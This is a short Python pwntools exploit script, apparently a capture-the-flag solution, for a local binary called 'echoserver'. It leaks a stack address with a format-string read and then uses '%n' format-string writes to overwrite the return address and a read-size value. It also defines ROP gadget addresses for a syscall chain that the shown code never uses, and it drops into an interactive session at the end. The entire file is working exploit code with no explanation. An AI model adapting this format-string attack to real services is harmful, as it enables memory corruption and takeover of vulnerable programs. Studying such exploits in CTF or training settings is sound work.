from pwn import *

r = process('./echoserver')

offset = 5

# 0x128 - alarm checker
# 0x150 - ret
# leak - %162$p

pop_eax = 0x080acfa6
pop_ebx = 0x0804901e
pop_ecx = 0x08063ca1 # pop ecx ; add al, 0xf6 ; ret
pop_edx = 0x08064ca8
syscall = 0x0806a88d

r.recvuntil('bytes')

# leak stack addr 
r.sendline('%162$p')
r.recvline()

leak = int(r.recvline().strip(),16)
ret = leak + 0x150
alarm_check = leak + 0x128
read_size = leak - 0x2e8

log.info('Leak: {}'.format(hex(leak)))
log.info('Ret: {}'.format(hex(ret)))
log.info('Alarm: {}'.format(hex(alarm_check)))
log.info('Read size: {}'.format(hex(read_size)))

raw_input()

r.recvuntil('bytes')

payload = p32(read_size)
payload += "%90d%5$n"
r.sendline(payload)

r.recvuntil('bytes')

payload = p32(ret)
payload += "%91d%5$n"
r.sendline(payload)

#r.recvuntil('bytes')
#payload = p32(alarm_check)
#payload += "%.1x%5$n"

#r.sendline(payload)
r.interactive()
